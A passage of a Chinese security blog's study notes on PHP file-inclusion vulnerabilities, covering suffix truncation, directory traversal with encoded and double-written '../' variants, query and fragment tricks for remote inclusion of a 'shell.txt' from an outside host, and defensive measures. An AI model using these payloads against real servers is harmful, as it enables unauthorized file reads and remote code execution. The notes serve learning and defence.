下 256 字节</p><p>linux 下 4096 字节</p><p><code>.</code>截断</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">?file=x.jpg<span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><br></code></pre></td></tr></table></figure><p><code>\.</code>截断</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=x.jpg<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>./.<br></code></pre></td></tr></table></figure><h2 id="文件包含绕过"><a href="#文件包含绕过" class="headerlink" title="文件包含绕过"></a>文件包含绕过</h2><p>分为两种情况，前缀和后缀，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其中<code>/var/www/html/</code>是前缀，<code>.php</code>是后缀，绕过这两种情况的方法不相同</p><h3 id="绕过前缀"><a href="#绕过前缀" class="headerlink" title="绕过前缀"></a>绕过前缀</h3><p>这里只考虑存在前缀的情况，先不考虑后缀。</p><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>可以用目录遍历绕过，payload：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>log/test.txt<br></code></pre></td></tr></table></figure><p>此时服务器实际拼接出来的路径为：<code>/var/www/html/../../log/test.txt</code>，即<code>/var/log/test.txt</code>，故成功绕过了前缀限制。</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>有些waf会对<code>../</code>做过滤或拦截，可以利用url编码绕过</p><p><strong>1.利用url编码</strong></p><ul><li>..&#x2F;<ul><li>%2e%2e%2f</li><li>..%2f</li><li>%2e%2e&#x2F;</li></ul></li><li>..\<ul><li>%2e%2e%5c</li><li>..%5c</li><li>%2e%2e\</li></ul></li></ul><p><strong>2.二次编码</strong></p><ul><li>..&#x2F;<ul><li>%252e%252e%252f</li></ul></li><li>..\<ul><li>%252e%252e%255c</li></ul></li></ul><p><strong>3.容器&#x2F;服务器的编码方式</strong></p><ul><li>..&#x2F;<ul><li>..%c0%af<ul><li>注：<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work">Why does Directory traversal attack %C0%AF work?</a></li></ul></li><li>%c0%ae%c0%ae&#x2F;<ul><li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li><li>Apache Tomcat Directory Traversal(Apache Tomcat 目录遍历)</li></ul></li></ul></li><li>..\<ul><li>..%c1%9c</li></ul></li></ul><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>如果waf过滤一次<code>../</code>，那么可以双写绕过，payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>log/test.txt<br></code></pre></td></tr></table></figure><h3 id="绕过后缀"><a href="#绕过后缀" class="headerlink" title="绕过后缀"></a>绕过后缀</h3><p>这里一样也是只考虑后缀，先不考虑前缀。</p><h4 id="query绕过"><a href="#query绕过" class="headerlink" title="query绕过"></a>query绕过</h4><p>url中的问号?代表后面跟的是查询参数，可以利用这个特性绕过后缀，问号?的url编码为%3f，在url中也可以用%3f代替，payload：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=<span class="hljs-keyword">http</span>://ip.com/<span class="hljs-built_in">shell</span>.txt%<span class="hljs-number">3</span>f<br></code></pre></td></tr></table></figure><p>在服务器中拼接成为<code>http://ip.com/shell.txt?.php</code>，相当于<code>.php</code>变成了查询参数</p><h4 id="fragment绕过"><a href="#fragment绕过" class="headerlink" title="fragment绕过"></a>fragment绕过</h4><p>fragment在url中也成为“锚点”，就是我们常见的井号#，在井号后面的字符会被锚点，而不是路径的一部分，所以也可以利用这个特性绕过后缀，井号#的url编码为%23，在url中可以用%23代替，payload：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=<span class="hljs-keyword">http</span>://ip.com/<span class="hljs-built_in">shell</span>.txt%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>会在服务器中拼接为<code>http://ip.com/shell.txt#.php</code>，<code>.php</code>被当成了锚点，造成了绕过</p><h4 id="截断绕过"><a href="#截断绕过" class="headerlink" title="截断绕过"></a>截断绕过</h4><p>上面截断攻击的部分已经介绍过了，这里不再赘述</p><h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><ol><li>严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是 否可被外部控制</li><li>路径限制：限制被包含的文件只能在某一文件内，一定要禁止目录跳转字符，如：”..&#x2F;“</li><li>包含文件验证：验证被包含的文件是否是白名单中的一员</li><li>尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include(‘head.php’)</li><li>设置 allow_url_include 为 Off</li></ol><h1 id="审计技巧"><a href="#审计技巧" class="headerlink" title="审计技巧"></a>审计技巧</h1><p>待补充…</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession">php文件包含漏洞</a></p><p><a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">一道CTF题：PHP文件包含</a></p></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/%E6%8A%80%E6%9C%AF/" class="category-chain-item">技术</a> <span>></span> <a href="/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="print-no-link">#文件包含</a> <a href="/tags/RCE/" class="print-no-link">#RCE</a></div></div><div class="license-box my-3"><div class="license-title"><div>php文件包含学习笔记</div><div>https://wanf3ng.github.io/2022/05/18/php文件包含学习笔记/</div></div><div class="license-meta"><div class="license-meta-item"><div>作者</div><div>wanf3ng</div></div><div class="license-meta-item license-meta-date"><div>发布于</div><div>2022年5月18日</div></div><div class="license-meta-item"><div>许可协议</div><div><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/"><span class="hint--top hint--rounded" aria-label="BY - 署名"><i class="iconfont icon-by"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/2022/05/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="命令执行漏洞学习笔记"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">命令执行漏洞学习笔记</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/2022/05/17/%E3%80%90%E7%BF%BB%E8%AF%91%E3%80%91%E9%80%9A%E8%BF%87nginx%E5%AE%9E%E7%8E%B0php%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="【翻译】通过nginx实现php本地文件包含"><span class="hidden-mobile">【翻译】通过nginx实现php本地文件包含</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id="comments" lazyload><div id="valine"></div><script type="text/javascript">Fluid.utils.loadComments("#valine",(function(){Fluid.utils.createScript("https://lib.baomitu.com/valine/1.5.1/Valine.min.js",(function(){var i=Object.assign({appId:"p02g21Pc8PhKfLm9ib0EkgvU-gzGzoHsz",appKey:"WvjDJdcuEIzre37U5HgmMBRy",path:"window.location.pathname",placeholder:"说点什么",avatar:"retro",meta:["nick","mail","link"],requiredFields:[],pageSize:10,lang:"zh-CN",highlight:!0,recordIP:!0,serverURLs:"",emojiCDN:null,emojiMaps:null,enableQQ:!0},{el:"#valine",path:window.location.pathname});new Valine(i),Fluid.utils.waitElementVisible("#valine .vcontent",()=>{var i="#valine .vcontent img:not(.vemoji)";Fluid.plugins.imageCaption(i),Fluid.plugins.fancyBox(i)})}))}))</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>目录</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a><div style="font-size:.85rem"><span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span><script src="/js/duration.js"></script></div></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">总访问量 <span id="busuanzi_value_site_pv"></span> 次 </span><span id="busuanzi_container_site_uv" style="display:none">总访客数 <span id="busuanzi_value_site_uv"></span> 人</span></div></div></footer><script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js"></script><script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script><script>!function(t,e){var i=Fluid.plugins.typing,n=e.getElementById("subtitle");n&&i&&i(n.getAttribute("data-typed-text"))}(window,document)</script><script src="/js/img-lazyload.js"></script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js",(function(){var t=jQuery("#toc");if(0!==t.length&&window.tocbot){var i=jQuery("#board-ctn").offset().top;window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-i},CONFIG.toc)),t.find(".toc-list-item").length>0&&t.css("visibility","visible"),Fluid.events.registerRefreshCallback((function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;t.find(".toc-list-item").length>0&&t.css("visibility","visible")}}))}}))</script><script src="https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript("https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js",(function(){window.anchors.options={placement:CONFIG.anchorjs.placement,visible:CONFIG.anchorjs.visible},CONFIG.anchorjs.icon&&(window.anchors.options.icon=CONFIG.anchorjs.icon);var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(window.anchors.options.class="anchorjs-link-left"),window.anchors.add(o.join(", ")),Fluid.events.registerRefreshCallback((function(){if("anchors"in window){anchors.removeAll();var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(anchors.options.class="anchorjs-link-left"),anchors.add(o.join(", "))}}))}))</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",(function(){Fluid.plugins.fancyBox()}))</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/custom.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div></noscript></body></html>